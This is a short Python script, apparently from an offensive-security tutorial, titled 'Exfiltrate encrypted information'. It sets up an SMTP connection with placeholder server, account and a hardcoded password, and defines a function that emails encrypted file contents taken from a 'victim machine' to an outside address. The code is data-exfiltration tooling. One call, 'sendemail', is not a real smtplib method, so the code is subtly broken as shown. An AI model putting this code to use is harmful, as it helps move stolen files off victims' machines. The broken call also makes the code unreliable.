# Exfiltrate encrypted information

import smtplib # for cross-platform e-mail funct
import time 
import win32com.client # for win specific functs

smtp_server = 'smtp.example.com' # Connect to SMTP (Simple Mail Transfer Protocol Server)
smtp_port = 587 
smtp_acct = 'an@example.com'
smtp_password = 'seKret'
tgt_accts = ['an@elsewhere.com']

def plain_email(subject, contents):
    message = f'Subject: {subject}\nFrom {smtp_acct}\n'
    message += f'To: {tgt_accts}\n\n{contents.decode()}'
    # Takes subject message as input; the subject = name of contents file in victim machine
    # The 𝘤𝘰𝘯𝘵𝘦𝘯𝘵𝘴 are the encrypted string from 𝘦𝘯𝘤𝘳𝘺𝘱𝘵
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_password)
    # Connect to server and log in
    
    # server.set_debuglevel(1) # to see if there are connection errors
    server.sendemail(smtp_acct, tgt_accts, message)
    # Invoque sendmail, and send
    time.sleep(1)
    server.quit()


